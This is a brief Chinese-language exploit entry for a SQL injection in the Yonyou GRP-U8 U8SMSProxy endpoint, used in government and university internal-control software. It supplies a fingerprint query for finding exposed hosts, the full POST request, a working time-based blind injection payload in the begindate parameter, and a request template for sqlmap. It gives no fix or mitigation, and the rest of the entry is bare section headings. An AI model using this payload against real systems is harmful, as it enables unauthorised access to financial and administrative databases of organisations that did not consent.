# 用友GRP-U8U8SMSProxysql注入

- **系统**：用友　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`app.name="用友GRP-U8 OA"`
- **请求**：`POST /U8SMSProxy?class=XXNote&id=qryyfs HTTP/1.1`
- **关键头**：`Host: xx.xx.xx.xx`　`Cookie: JSESSIONID=FD111DFB1059473AF214DB0E529918E5`　`Content-Type: application/x-www-form-urlencoded`　`Content-Length: 78`

**请求体 / payload**
```
begindate=2020-09-27';WAITFOR DELAY '0:0:5'--&enddate=2020-10-27&search=

sqlmap
POST /U8SMSProxy?class=XXNote&id=qryyfs HTTP/1.1
Host: xx.xx.xx.xx
Cookie: JSESSIONID=FD111DFB1059473AF214DB0E529918E5
Content-Type: application/x-www-form-urlencoded
Content-Length: 78
begindate=2020-09-27&enddate=2020-10-27&search=
```

**其他**
- 用友GRP-U8 U8SMSProxy sql注入: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 用友GRP-U8 行政事业内控管理软件（新政府会计制度专版）
* 用友GRP-U8 高校内控管理软件（Manager版）